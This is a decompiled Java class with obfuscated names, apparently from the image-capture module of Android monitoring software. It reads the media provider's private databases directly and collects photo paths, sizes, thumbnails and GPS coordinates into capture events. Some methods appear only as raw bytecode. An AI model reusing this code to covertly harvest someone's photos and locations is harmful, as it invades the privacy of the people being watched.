package com.vvt.capture.camera.image.a;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.os.SystemClock;
import com.vvt.io.d;
import java.io.File;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;

public class a
{
  private static final boolean a;
  private static final boolean b;
  private static final boolean c;
  private static final File[] d;
  private static final String[] e;
  
  static
  {
    int i = 2;
    int j = 1;
    a = com.vvt.ak.a.a;
    b = com.vvt.ak.a.b;
    c = com.vvt.ak.a.e;
    Object localObject = new File[i];
    File localFile = new java/io/File;
    localFile.<init>("/data/data/com.android.providers.media/databases/");
    localObject[0] = localFile;
    localFile = new java/io/File;
    localFile.<init>("/dbdata/databases/com.android.providers.media/");
    localObject[j] = localFile;
    d = (File[])localObject;
    localObject = new String[4];
    localObject[0] = "image_id";
    localObject[j] = "width";
    localObject[i] = "height";
    localObject[3] = "_data";
    e = (String[])localObject;
  }
  
  private static SQLiteDatabase a(String paramString, int paramInt)
  {
    SQLiteDatabase localSQLiteDatabase = b(paramString, paramInt);
    int i = 5;
    while ((localSQLiteDatabase == null) && (i > 0))
    {
      boolean bool = a;
      if (bool) {}
      long l = 1000L;
      SystemClock.sleep(l);
      localSQLiteDatabase = b(paramString, paramInt);
      i += -1;
    }
    return localSQLiteDatabase;
  }
  
  public static String a()
  {
    boolean bool1 = a;
    if (bool1) {}
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    File[] arrayOfFile = d;
    String str1 = "external";
    String str2 = "db";
    boolean bool2 = d.a(arrayOfFile, str1, localStringBuilder, str2);
    if (!bool2)
    {
      bool2 = c;
      if (!bool2) {
        break label67;
      }
    }
    for (;;)
    {
      bool2 = a;
      if (bool2) {}
      return localStringBuilder.toString();
      label67:
      bool2 = b;
      if (!bool2) {}
    }
  }
  
  /* Error */
  private static String a(SQLiteDatabase paramSQLiteDatabase, long paramLong)
  {
    // Byte code:
    //   0: getstatic 19	com/vvt/capture/camera/image/a/a:a	Z
    //   3: istore_3
    //   4: iload_3
    //   5: ifeq +3 -> 8
    //   8: ldc 86
    //   10: astore 4
    //   12: iconst_2
    //   13: istore 5
    //   15: iload 5
    //   17: anewarray 4	java/lang/Object
    //   20: astore 6
    //   22: aconst_null
    //   23: astore 7
    //   25: aload 6
    //   27: iconst_0
    //   28: ldc 43
    //   30: aastore
    //   31: iconst_1
    //   32: istore 8
    //   34: lload_1
    //   35: invokestatic 92	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   38: astore 9
    //   40: aload 6
    //   42: iload 8
    //   44: aload 9
    //   46: aastore
    //   47: aload 4
    //   49: aload 6
    //   51: invokestatic 96	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   54: astore 9
    //   56: ldc 98
    //   58: astore 10
    //   60: ldc 100
    //   62: astore 6
    //   64: getstatic 52	com/vvt/capture/camera/image/a/a:e	[Ljava/lang/String;
    //   67: astore 7
    //   69: aload_0
    //   70: astore 4
    //   72: aload_0
    //   73: aload 6
    //   75: aload 7
    //   77: aload 9
    //   79: aconst_null
    //   80: aconst_null
    //   81: aconst_null
    //   82: aconst_null
    //   83: invokevirtual 106	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   86: astore 6
    //   88: aload 6
    //   90: ifnull +181 -> 271
    //   93: aload 6
    //   95: invokeinterface 112 1 0
    //   100: istore_3
    //   101: iload_3
    //   102: ifeq +169 -> 271
    //   105: ldc 50
    //   107: astore 4
    //   109: aload 6
    //   111: aload 4
    //   113: invokeinterface 116 2 0
    //   118: istore_3
    //   119: aload 6
    //   121: iload_3
    //   122: invokeinterface 120 2 0
    //   127: astore 10
    //   129: aload 10
    //   131: astore 4
    //   133: aload 6
    //   135: ifnull +10 -> 145
    //   138: aload 6
    //   140: invokeinterface 123 1 0
    //   145: getstatic 19	com/vvt/capture/camera/image/a/a:a	Z
    //   148: istore 5
    //   150: iload 5
    //   152: ifeq +3 -> 155
    //   155: aload 4
    //   157: invokestatic 127	com/vvt/io/d:AppEngine1	(Ljava/lang/String;)Ljava/lang/String;
    //   160: astore 4
    //   162: getstatic 19	com/vvt/capture/camera/image/a/a:a	Z
    //   165: istore 5
    //   167: iload 5
    //   169: ifeq +3 -> 172
    //   172: getstatic 19	com/vvt/capture/camera/image/a/a:a	Z
    //   175: istore 5
    //   177: iload 5
    //   179: ifeq +3 -> 182
    //   182: aload 4
    //   184: areturn
    //   185: astore 4
    //   187: iconst_0
    //   188: istore_3
    //   189: aconst_null
    //   190: astore 4
    //   192: getstatic 26	com/vvt/capture/camera/image/a/a:MyUncaughtExceptionHandler	Z
    //   195: istore 5
    //   197: iload 5
    //   199: ifeq +3 -> 202
    //   202: aload 4
    //   204: ifnull +10 -> 214
    //   207: aload 4
    //   209: invokeinterface 123 1 0
    //   214: aload 10
    //   216: astore 4
    //   218: goto -73 -> 145
    //   221: astore 4
    //   223: iconst_0
    //   224: istore 5
    //   226: aconst_null
    //   227: astore 6
    //   229: aload 6
    //   231: ifnull +10 -> 241
    //   234: aload 6
    //   236: invokeinterface 123 1 0
    //   241: aload 4
    //   243: athrow
    //   244: astore 4
    //   246: goto -17 -> 229
    //   249: astore 11
    //   251: aload 4
    //   253: astore 6
    //   255: aload 11
    //   257: astore 4
    //   259: goto -30 -> 229
    //   262: astore 4
    //   264: aload 6
    //   266: astore 4
    //   268: goto -76 -> 192
    //   271: aload 10
    //   273: astore 4
    //   275: goto -142 -> 133
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	278	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	278	1	paramLong	long
    //   3	99	3	bool1	boolean
    //   118	71	3	i	int
    //   10	173	4	localObject1	Object
    //   185	1	4	localException1	Exception
    //   190	27	4	localObject2	Object
    //   221	21	4	localObject3	Object
    //   244	8	4	localObject4	Object
    //   257	1	4	localObject5	Object
    //   262	1	4	localException2	Exception
    //   266	8	4	localObject6	Object
    //   13	3	5	j	int
    //   148	77	5	bool2	boolean
    //   20	245	6	localObject7	Object
    //   23	53	7	arrayOfString	String[]
    //   32	11	8	k	int
    //   38	40	9	localObject8	Object
    //   58	214	10	str	String
    //   249	7	11	localObject9	Object
    // Exception table:
    //   from	to	target	type
    //   64	67	185	java/lang/Exception
    //   82	86	185	java/lang/Exception
    //   64	67	221	finally
    //   82	86	221	finally
    //   93	100	244	finally
    //   111	118	244	finally
    //   121	127	244	finally
    //   192	195	249	finally
    //   93	100	262	java/lang/Exception
    //   111	118	262	java/lang/Exception
    //   121	127	262	java/lang/Exception
  }
  
  public static ArrayList a(String paramString1, String paramString2, List paramList1, List paramList2)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    if ((paramList1 == null) || (paramList2 == null)) {}
    for (Object localObject = localArrayList;; localObject = localArrayList)
    {
      return (ArrayList)localObject;
      Iterator localIterator = paramList2.iterator();
      for (;;)
      {
        bool1 = localIterator.hasNext();
        if (!bool1) {
          break;
        }
        localObject = (Long)localIterator.next();
        boolean bool2 = paramList1.contains(localObject);
        if (!bool2)
        {
          long l = ((Long)localObject).longValue();
          bool1 = b;
          if (bool1) {}
          localObject = a(paramString1, paramString2, l);
          localArrayList.addAll((Collection)localObject);
        }
      }
      bool1 = a;
      if (!bool1) {}
    }
  }
  
  public static List a(String paramString)
  {
    boolean bool1 = false;
    localCursor = null;
    synchronized (a.class)
    {
      boolean bool2 = a;
      if (bool2) {}
      bool2 = a;
      if (bool2) {}
      ArrayList localArrayList = new java/util/ArrayList;
      localArrayList.<init>();
      localSQLiteDatabase = b(paramString);
      boolean bool3 = false;
      Object localObject3 = null;
      if (localSQLiteDatabase != null) {}
      do
      {
        for (;;)
        {
          try
          {
            boolean bool5 = localSQLiteDatabase.isDbLockedByCurrentThread();
            if (!bool5)
            {
              bool5 = localSQLiteDatabase.isDbLockedByOtherThreads();
              if (!bool5) {}
            }
            else
            {
              bool5 = b;
              if ((!bool5) || (localSQLiteDatabase != null)) {
                localSQLiteDatabase.close();
              }
              if (0 != 0) {
                null.close();
              }
              if (localSQLiteDatabase != null) {
                localSQLiteDatabase.close();
              }
              return localArrayList;
            }
            localObject3 = "SELECT %s FROM %s";
            int j = 2;
            Object[] arrayOfObject = new Object[j];
            int k = 0;
            String str = "_id";
            arrayOfObject[0] = str;
            k = 1;
            str = "images";
            arrayOfObject[k] = str;
            localObject3 = String.format((String)localObject3, arrayOfObject);
            boolean bool6 = b;
            if (bool6) {}
            bool6 = false;
            arrayOfObject = null;
            localCursor = localSQLiteDatabase.rawQuery((String)localObject3, null);
            if (localCursor != null) {
              continue;
            }
            bool3 = c;
            if (!bool3) {}
          }
          catch (Exception localException)
          {
            int i;
            long l;
            boolean bool4 = c;
            if ((bool4) && (localCursor == null)) {
              continue;
            }
            localCursor.close();
            if (localSQLiteDatabase == null) {
              continue;
            }
            localSQLiteDatabase.close();
            continue;
            localObject1 = finally;
            throw ((Throwable)localObject1);
          }
          finally
          {
            if (localCursor == null) {
              continue;
            }
            localCursor.close();
            if (localSQLiteDatabase == null) {
              continue;
            }
            localSQLiteDatabase.close();
          }
          bool1 = b;
          if (bool1) {}
          bool1 = a;
          if (!bool1) {}
        }
        bool3 = localCursor.moveToNext();
      } while (!bool3);
      localObject3 = "_id";
      i = localCursor.getColumnIndex((String)localObject3);
      l = localCursor.getLong(i);
      localObject3 = Long.valueOf(l);
      localArrayList.add(localObject3);
    }
  }
  
  public static List a(String paramString, int paramInt, long paramLong)
  {
    boolean bool1 = false;
    localCursor = null;
    synchronized (a.class)
    {
      boolean bool2 = a;
      if (bool2) {}
      bool2 = a;
      if (bool2) {}
      ArrayList localArrayList = new java/util/ArrayList;
      localArrayList.<init>();
      localSQLiteDatabase = b(paramString);
      int i = 0;
      Object localObject3 = null;
      if (localSQLiteDatabase != null) {}
      label449:
      do
      {
        for (;;)
        {
          try
          {
            boolean bool5 = localSQLiteDatabase.isDbLockedByCurrentThread();
            if (!bool5)
            {
              bool5 = localSQLiteDatabase.isDbLockedByOtherThreads();
              if (!bool5) {}
            }
            else
            {
              bool5 = b;
              if ((!bool5) || (localSQLiteDatabase != null)) {
                localSQLiteDatabase.close();
              }
              if (0 != 0) {
                null.close();
              }
              if (localSQLiteDatabase != null) {
                localSQLiteDatabase.close();
              }
              return localArrayList;
            }
            i = -1;
            if (paramInt == i) {
              paramInt = -1 >>> 1;
            }
            localObject3 = "SELECT %s, %s FROM %s WHERE %s < %d ORDER BY %s DESC";
            int k = 6;
            Object[] arrayOfObject = new Object[k];
            m = 0;
            str = null;
            Object localObject4 = "_id";
            arrayOfObject[0] = localObject4;
            m = 1;
            localObject4 = "_data";
            arrayOfObject[m] = localObject4;
            m = 2;
            localObject4 = "images";
            arrayOfObject[m] = localObject4;
            m = 3;
            localObject4 = "_size";
            arrayOfObject[m] = localObject4;
            m = 4;
            localObject4 = Long.valueOf(paramLong);
            arrayOfObject[m] = localObject4;
            m = 5;
            localObject4 = "date_modified";
            arrayOfObject[m] = localObject4;
            localObject3 = String.format((String)localObject3, arrayOfObject);
            boolean bool6 = b;
            if (bool6) {}
            bool6 = false;
            arrayOfObject = null;
            localCursor = localSQLiteDatabase.rawQuery((String)localObject3, null);
            if (localCursor != null) {
              continue;
            }
            bool3 = c;
            if (!bool3) {}
          }
          catch (Exception localException)
          {
            int m;
            String str;
            boolean bool3;
            long l;
            int n;
            boolean bool4 = c;
            if ((bool4) && (localCursor == null)) {
              continue;
            }
            localCursor.close();
            if (localSQLiteDatabase == null) {
              continue;
            }
            localSQLiteDatabase.close();
            continue;
            localObject1 = finally;
            throw ((Throwable)localObject1);
          }
          finally
          {
            if (localCursor == null) {
              continue;
            }
            localCursor.close();
            if (localSQLiteDatabase == null) {
              continue;
            }
            localSQLiteDatabase.close();
          }
          bool1 = b;
          if (bool1) {}
          bool1 = a;
          if (!bool1) {}
        }
        for (;;)
        {
          bool3 = localCursor.moveToNext();
          if (!bool3) {
            break;
          }
          localObject3 = "_id";
          int j = localCursor.getColumnIndexOrThrow((String)localObject3);
          l = localCursor.getLong(j);
          str = "_data";
          m = localCursor.getColumnIndexOrThrow(str);
          str = localCursor.getString(m);
          str = d.h(str);
          boolean bool8 = a;
          if (bool8) {}
          boolean bool7 = d.e(str);
          if (bool7) {
            break label449;
          }
          bool4 = a;
          if (!bool4) {}
        }
        n = localArrayList.size();
      } while (n >= paramInt);
      localObject3 = Long.valueOf(l);
      localArrayList.add(localObject3);
    }
  }
  
  /* Error */
  private static List a(String paramString1, String paramString2, long paramLong)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore 4
    //   3: getstatic 19	com/vvt/capture/camera/image/a/a:a	Z
    //   6: istore 5
    //   8: iload 5
    //   10: ifeq +3 -> 13
    //   13: getstatic 19	com/vvt/capture/camera/image/a/a:a	Z
    //   16: istore 5
    //   18: iload 5
    //   20: ifeq +3 -> 23
    //   23: new 131	java/util/ArrayList
    //   26: astore 6
    //   28: aload 6
    //   30: invokespecial 132	java/util/ArrayList:<init>	()V
    //   33: iconst_2
    //   34: istore 7
    //   36: iload 7
    //   38: anewarray 4	java/lang/Object
    //   41: astore 8
    //   43: aload 8
    //   45: iconst_0
    //   46: ldc -80
    //   48: aastore
    //   49: lload_2
    //   50: invokestatic 92	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   53: astore 9
    //   55: aload 8
    //   57: iconst_1
    //   58: aload 9
    //   60: aastore
    //   61: ldc 86
    //   63: aload 8
    //   65: invokestatic 96	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   68: astore 9
    //   70: aload_1
    //   71: invokestatic 165	com/vvt/capture/camera/image/a/a:removeFromPath	(Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   74: astore 10
    //   76: ldc -78
    //   78: astore 8
    //   80: iconst_0
    //   81: istore 11
    //   83: aconst_null
    //   84: astore 12
    //   86: iconst_0
    //   87: istore 13
    //   89: aconst_null
    //   90: astore 14
    //   92: aconst_null
    //   93: astore 15
    //   95: aconst_null
    //   96: astore 16
    //   98: iconst_0
    //   99: istore 17
    //   101: aconst_null
    //   102: astore 18
    //   104: aload 10
    //   106: aload 8
    //   108: aconst_null
    //   109: aload 9
    //   111: aconst_null
    //   112: aconst_null
    //   113: aconst_null
    //   114: aconst_null
    //   115: invokevirtual 106	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   118: astore 8
    //   120: aload 8
    //   122: ifnull +478 -> 600
    //   125: aload 8
    //   127: invokeinterface 185 1 0
    //   132: istore 11
    //   134: iload 11
    //   136: ifeq +464 -> 600
    //   139: ldc -80
    //   141: astore 12
    //   143: aload 8
    //   145: aload 12
    //   147: invokeinterface 202 2 0
    //   152: istore 11
    //   154: aload 8
    //   156: iload 11
    //   158: invokeinterface 213 2 0
    //   163: istore 11
    //   165: ldc 50
    //   167: astore 9
    //   169: aload 8
    //   171: aload 9
    //   173: invokeinterface 202 2 0
    //   178: istore 19
    //   180: aload 8
    //   182: iload 19
    //   184: invokeinterface 120 2 0
    //   189: astore 9
    //   191: ldc -41
    //   193: astore 14
    //   195: aload 8
    //   197: aload 14
    //   199: invokeinterface 202 2 0
    //   204: istore 13
    //   206: aload 8
    //   208: iload 13
    //   210: invokeinterface 120 2 0
    //   215: astore 14
    //   217: aload 14
    //   219: invokestatic 220	com/vvt/events/f:a	(Ljava/lang/String;)Lcom/vvt/events/FxMediaType;
    //   222: astore 14
    //   224: new 222	java/util/Date
    //   227: astore 15
    //   229: aload 15
    //   231: invokespecial 223	java/util/Date:<init>	()V
    //   234: aload 15
    //   236: invokevirtual 226	java/util/Date:getTime	()J
    //   239: lstore 20
    //   241: aload 9
    //   243: invokestatic 127	com/vvt/io/d:AppEngine1	(Ljava/lang/String;)Ljava/lang/String;
    //   246: astore 9
    //   248: getstatic 19	com/vvt/capture/camera/image/a/a:a	Z
    //   251: istore 17
    //   253: iload 17
    //   255: ifeq +3 -> 258
    //   258: aload 9
    //   260: invokestatic 205	com/vvt/io/d:e	(Ljava/lang/String;)Z
    //   263: istore 17
    //   265: iload 17
    //   267: ifne +16 -> 283
    //   270: getstatic 19	com/vvt/capture/camera/image/a/a:a	Z
    //   273: istore 11
    //   275: iload 11
    //   277: ifeq -152 -> 125
    //   280: goto -155 -> 125
    //   283: new 228	com/vvt/capture/camera/image/removeFromPath
    //   286: astore 18
    //   288: aload 18
    //   290: invokespecial 229	com/vvt/capture/camera/image/removeFromPath:<init>	()V
    //   293: aload 18
    //   295: lload 20
    //   297: invokevirtual 231	com/vvt/capture/camera/image/removeFromPath:MyUncaughtExceptionHandler	(J)V
    //   300: new 28	java/io/File
    //   303: astore 15
    //   305: aload 15
    //   307: aload 9
    //   309: invokespecial 34	java/io/File:<init>	(Ljava/lang/String;)V
    //   312: aload 15
    //   314: invokevirtual 234	java/io/File:length	()J
    //   317: lstore 20
    //   319: aload 18
    //   321: lload 20
    //   323: invokevirtual 236	com/vvt/capture/camera/image/removeFromPath:removeFromPath	(J)V
    //   326: aload 18
    //   328: aload 14
    //   330: invokevirtual 239	com/vvt/capture/camera/image/removeFromPath:a	(Lcom/vvt/events/FxMediaType;)V
    //   333: iload 11
    //   335: i2l
    //   336: lstore 22
    //   338: aload 18
    //   340: lload 22
    //   342: invokevirtual 241	com/vvt/capture/camera/image/removeFromPath:a	(J)V
    //   345: iload 11
    //   347: i2l
    //   348: lstore 22
    //   350: aload 10
    //   352: lload 22
    //   354: invokestatic 244	com/vvt/capture/camera/image/a/a:a	(Landroid/database/sqlite/SQLiteDatabase;J)Ljava/lang/String;
    //   357: astore 12
    //   359: aload 12
    //   361: invokestatic 248	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   364: istore 13
    //   366: iload 13
    //   368: ifne +187 -> 555
    //   371: sipush 800
    //   374: istore 13
    //   376: aload 12
    //   378: aload_0
    //   379: iload 13
    //   381: invokestatic 254	com/vvt/io/o:a	(Ljava/lang/String;Ljava/lang/String;I)Ljava/lang/String;
    //   384: astore 12
    //   386: getstatic 19	com/vvt/capture/camera/image/a/a:a	Z
    //   389: istore 13
    //   391: iload 13
    //   393: ifeq +3 -> 396
    //   396: aload 18
    //   398: aload 9
    //   400: invokevirtual 256	com/vvt/capture/camera/image/removeFromPath:a	(Ljava/lang/String;)V
    //   403: aload 18
    //   405: aload 12
    //   407: invokevirtual 258	com/vvt/capture/camera/image/removeFromPath:removeFromPath	(Ljava/lang/String;)V
    //   410: ldc_w 260
    //   413: astore 12
    //   415: aload 8
    //   417: aload 12
    //   419: invokeinterface 202 2 0
    //   424: istore 11
    //   426: aload 8
    //   428: iload 11
    //   430: invokeinterface 264 2 0
    //   435: dstore 24
    //   437: ldc_w 266
    //   440: astore 14
    //   442: aload 8
    //   444: aload 14
    //   446: invokeinterface 202 2 0
    //   451: istore 13
    //   453: aload 8
    //   455: iload 13
    //   457: invokeinterface 264 2 0
    //   462: dstore 26
    //   464: new 268	com/vvt/events/MyUncaughtExceptionHandler
    //   467: astore 16
    //   469: aload 16
    //   471: invokespecial 269	com/vvt/events/MyUncaughtExceptionHandler:<init>	()V
    //   474: aload 16
    //   476: dload 24
    //   478: invokevirtual 272	com/vvt/events/MyUncaughtExceptionHandler:a	(D)V
    //   481: aload 16
    //   483: dload 26
    //   485: invokevirtual 274	com/vvt/events/MyUncaughtExceptionHandler:removeFromPath	(D)V
    //   488: aload 18
    //   490: aload 16
    //   492: invokevirtual 277	com/vvt/capture/camera/image/removeFromPath:a	(Lcom/vvt/events/MyUncaughtExceptionHandler;)V
    //   495: aload 6
    //   497: aload 18
    //   499: invokeinterface 192 2 0
    //   504: pop
    //   505: goto -380 -> 125
    //   508: astore 12
    //   510: getstatic 26	com/vvt/capture/camera/image/a/a:MyUncaughtExceptionHandler	Z
    //   513: istore 11
    //   515: iload 11
    //   517: ifeq +3 -> 520
    //   520: aload 8
    //   522: ifnull +10 -> 532
    //   525: aload 8
    //   527: invokeinterface 123 1 0
    //   532: aload 10
    //   534: ifnull +8 -> 542
    //   537: aload 10
    //   539: invokevirtual 172	android/database/sqlite/SQLiteDatabase:close	()V
    //   542: getstatic 19	com/vvt/capture/camera/image/a/a:a	Z
    //   545: istore 5
    //   547: iload 5
    //   549: ifeq +3 -> 552
    //   552: aload 6
    //   554: areturn
    //   555: sipush 800
    //   558: istore 11
    //   560: aload 9
    //   562: aload_0
    //   563: iload 11
    //   565: invokestatic 254	com/vvt/io/o:a	(Ljava/lang/String;Ljava/lang/String;I)Ljava/lang/String;
    //   568: astore 12
    //   570: goto -184 -> 386
    //   573: astore 8
    //   575: aload 4
    //   577: ifnull +10 -> 587
    //   580: aload 4
    //   582: invokeinterface 123 1 0
    //   587: aload 10
    //   589: ifnull +8 -> 597
    //   592: aload 10
    //   594: invokevirtual 172	android/database/sqlite/SQLiteDatabase:close	()V
    //   597: aload 8
    //   599: athrow
    //   600: aload 8
    //   602: ifnull +10 -> 612
    //   605: aload 8
    //   607: invokeinterface 123 1 0
    //   612: aload 10
    //   614: ifnull -72 -> 542
    //   617: goto -80 -> 537
    //   620: astore 12
    //   622: aload 8
    //   624: astore 4
    //   626: aload 12
    //   628: astore 8
    //   630: goto -55 -> 575
    //   633: astore 8
    //   635: iconst_0
    //   636: istore 7
    //   638: aconst_null
    //   639: astore 8
    //   641: goto -131 -> 510
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	644	0	paramString1	String
    //   0	644	1	paramString2	String
    //   0	644	2	paramLong	long
    //   1	624	4	localObject1	Object
    //   6	542	5	bool1	boolean
    //   26	527	6	localArrayList	ArrayList
    //   34	603	7	i	int
    //   41	485	8	localObject2	Object
    //   573	50	8	localObject3	Object
    //   628	1	8	localObject4	Object
    //   633	1	8	localException1	Exception
    //   639	1	8	localObject5	Object
    //   53	508	9	localObject6	Object
    //   74	539	10	localSQLiteDatabase	SQLiteDatabase
    //   81	54	11	bool2	boolean
    //   152	12	11	j	int
    //   273	73	11	bool3	boolean
    //   424	5	11	k	int
    //   513	3	11	bool4	boolean
    //   558	6	11	m	int
    //   84	334	12	str1	String
    //   508	1	12	localException2	Exception
    //   568	1	12	str2	String
    //   620	7	12	localObject7	Object
    //   87	122	13	n	int
    //   364	3	13	bool5	boolean
    //   374	6	13	i1	int
    //   389	3	13	bool6	boolean
    //   451	5	13	i2	int
    //   90	355	14	localObject8	Object
    //   93	220	15	localObject9	Object
    //   96	395	16	localc	com.vvt.events.MyUncaughtExceptionHandler
    //   99	167	17	bool7	boolean
    //   102	396	18	localb	com.vvt.capture.camera.image.removeFromPath
    //   178	5	19	i3	int
    //   239	83	20	l1	long
    //   336	17	22	l2	long
    //   435	42	24	d1	double
    //   462	22	26	d2	double
    // Exception table:
    //   from	to	target	type
    //   125	132	508	java/lang/Exception
    //   145	152	508	java/lang/Exception
    //   156	163	508	java/lang/Exception
    //   171	178	508	java/lang/Exception
    //   182	189	508	java/lang/Exception
    //   197	204	508	java/lang/Exception
    //   208	215	508	java/lang/Exception
    //   217	222	508	java/lang/Exception
    //   224	227	508	java/lang/Exception
    //   229	234	508	java/lang/Exception
    //   234	239	508	java/lang/Exception
    //   241	246	508	java/lang/Exception
    //   248	251	508	java/lang/Exception
    //   258	263	508	java/lang/Exception
    //   270	273	508	java/lang/Exception
    //   283	286	508	java/lang/Exception
    //   288	293	508	java/lang/Exception
    //   295	300	508	java/lang/Exception
    //   300	303	508	java/lang/Exception
    //   307	312	508	java/lang/Exception
    //   312	317	508	java/lang/Exception
    //   321	326	508	java/lang/Exception
    //   328	333	508	java/lang/Exception
    //   340	345	508	java/lang/Exception
    //   352	357	508	java/lang/Exception
    //   359	364	508	java/lang/Exception
    //   379	384	508	java/lang/Exception
    //   386	389	508	java/lang/Exception
    //   398	403	508	java/lang/Exception
    //   405	410	508	java/lang/Exception
    //   417	424	508	java/lang/Exception
    //   428	435	508	java/lang/Exception
    //   444	451	508	java/lang/Exception
    //   455	462	508	java/lang/Exception
    //   464	467	508	java/lang/Exception
    //   469	474	508	java/lang/Exception
    //   476	481	508	java/lang/Exception
    //   483	488	508	java/lang/Exception
    //   490	495	508	java/lang/Exception
    //   497	505	508	java/lang/Exception
    //   563	568	508	java/lang/Exception
    //   114	118	573	finally
    //   125	132	620	finally
    //   145	152	620	finally
    //   156	163	620	finally
    //   171	178	620	finally
    //   182	189	620	finally
    //   197	204	620	finally
    //   208	215	620	finally
    //   217	222	620	finally
    //   224	227	620	finally
    //   229	234	620	finally
    //   234	239	620	finally
    //   241	246	620	finally
    //   248	251	620	finally
    //   258	263	620	finally
    //   270	273	620	finally
    //   283	286	620	finally
    //   288	293	620	finally
    //   295	300	620	finally
    //   300	303	620	finally
    //   307	312	620	finally
    //   312	317	620	finally
    //   321	326	620	finally
    //   328	333	620	finally
    //   340	345	620	finally
    //   352	357	620	finally
    //   359	364	620	finally
    //   379	384	620	finally
    //   386	389	620	finally
    //   398	403	620	finally
    //   405	410	620	finally
    //   417	424	620	finally
    //   428	435	620	finally
    //   444	451	620	finally
    //   455	462	620	finally
    //   464	467	620	finally
    //   469	474	620	finally
    //   476	481	620	finally
    //   483	488	620	finally
    //   490	495	620	finally
    //   497	505	620	finally
    //   510	513	620	finally
    //   563	568	620	finally
    //   114	118	633	java/lang/Exception
  }
  
  private static SQLiteDatabase b(String paramString)
  {
    return a(paramString, 17);
  }
  
  private static SQLiteDatabase b(String paramString, int paramInt)
  {
    SQLiteDatabase localSQLiteDatabase = null;
    try
    {
      File localFile = new java/io/File;
      localFile.<init>(paramString);
      bool = localFile.exists();
      if (!bool) {}
      bool = false;
      localFile = null;
      localSQLiteDatabase = SQLiteDatabase.openDatabase(paramString, null, paramInt);
    }
    catch (SQLiteException localSQLiteException)
    {
      for (;;)
      {
        boolean bool = c;
        if (!bool) {}
      }
    }
    return localSQLiteDatabase;
  }
  
  public static String b()
  {
    boolean bool1 = a;
    if (bool1) {}
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    File[] arrayOfFile = d;
    String str1 = "internal";
    String str2 = "db";
    boolean bool2 = d.a(arrayOfFile, str1, localStringBuilder, str2);
    if (!bool2)
    {
      bool2 = c;
      if (!bool2) {
        break label68;
      }
    }
    for (;;)
    {
      bool2 = a;
      if (bool2) {}
      return localStringBuilder.toString();
      label68:
      bool2 = b;
      if (!bool2) {}
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/camera/image/a/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */